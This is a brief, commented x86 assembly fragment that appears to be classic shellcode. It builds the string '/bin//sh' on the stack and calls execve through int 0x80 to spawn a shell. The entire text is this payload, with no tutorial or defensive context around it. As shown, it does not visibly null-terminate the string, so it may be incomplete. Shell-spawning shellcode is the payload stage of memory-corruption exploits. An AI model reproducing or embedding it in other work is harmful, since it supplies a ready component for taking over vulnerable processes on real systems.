# eax = sys_execve
mov eax, __NR_SYS_execve
# write /bin/sh @esp
mov dword ptr [esp], "nib/"
mov dword ptr [esp+4], "hs//"
# ebx = @/bin/sh
mov ebx, esp
# nullify the other args
xor ecx, ecx
xor edx, edx
# trigger interrupt
int 0x80
